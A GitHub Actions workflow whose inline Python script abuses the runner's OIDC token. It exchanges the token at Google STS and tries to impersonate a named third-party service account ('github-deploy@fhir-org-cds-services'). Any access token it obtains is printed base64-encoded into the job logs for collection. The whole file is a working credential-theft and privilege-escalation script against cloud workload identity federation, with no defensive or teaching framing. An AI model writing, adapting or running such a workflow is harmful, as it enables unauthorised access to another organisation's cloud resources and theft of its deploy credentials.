
name: c211-i84832-sweep
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  sweep:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - name: sweep
        run: |
          python3 - <<'PY'
          import json, os, subprocess, urllib.parse, urllib.request, urllib.error, time
          TARGET='github-deploy@fhir-org-cds-services.iam.gserviceaccount.com'
          CAND=json.loads(__import__('base64').b64decode('').decode())
          def jl(b):
              try: return json.loads(b)
              except Exception: return {}
          def post(url,data,headers=None):
              h={'Content-Type':'application/json','Accept':'application/json','User-Agent':'c211-i84832'}
              if headers: h.update(headers)
              r=urllib.request.Request(url,data=json.dumps(data).encode(),method='POST',headers=h)
              try:
                  resp=urllib.request.urlopen(r,timeout=45); return resp.status,resp.read().decode()
              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
              except Exception as e: return -1,repr(e)[:200]
          def emit(o): print('RESULT '+json.dumps(o),flush=True)
          u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
          if not u or not t:
              emit({'kind':'envfail'}); raise SystemExit
          sts_ok=0; mint_ok=0
          for prov, sa in CAND:
              aud='//iam.googleapis.com/'+prov
              u2=u+'&audience='+urllib.parse.quote(aud,safe='')
              out=subprocess.run(['curl','-sS','-m','25','-H','Authorization: Bearer '+t,u2],capture_output=True,text=True).stdout
              idt=jl(out).get('value','')
              if not idt:
                  emit({'p':prov,'stage':'idtoken','ok':False}); continue
              st,b=post('https://sts.googleapis.com/v1/token',{
                  'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
                  'audience':aud,'scope':'https://www.googleapis.com/auth/cloud-platform',
                  'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
                  'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':idt})
              j=jl(b); fed=j.get('access_token','')
              if not fed:
                  emit({'p':prov,'stage':'sts','http':st,'err':(j.get('error_description') or b[:120])})
                  continue
              sts_ok+=1
              st1,b1=post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'+urllib.parse.quote(sa,safe='')+':generateAccessToken',
                    {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'},
                    headers={'Authorization':'Bearer '+fed})
              j1=jl(b1); own=bool(j1.get('accessToken'))
              if own: mint_ok+=1
              st2,b2=post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'+urllib.parse.quote(TARGET,safe='')+':generateAccessToken',
                    {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'},
                    headers={'Authorization':'Bearer '+fed})
              j2=jl(b2); tgt=bool(j2.get('accessToken'))
              emit({'p':prov,'sa':sa,'stage':'mint','sts':200,'own':own,'own_http':st1,'fhir_sa':tgt,'fhir_http':st2,
                    'fhir_err':None if tgt else (j2.get('error',{}).get('message') or b2[:120])})
              if tgt:
                  import base64
                  emit({'p':prov,'stage':'TARGET_TOKEN','tok_b64':base64.b64encode(j2['accessToken'].encode()).decode(),
                        'expire':j2.get('expireTime')})
          emit({'kind':'summary','sts_ok':sts_ok,'mint_ok':mint_ok,'n':len(CAND),'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())})
          PY
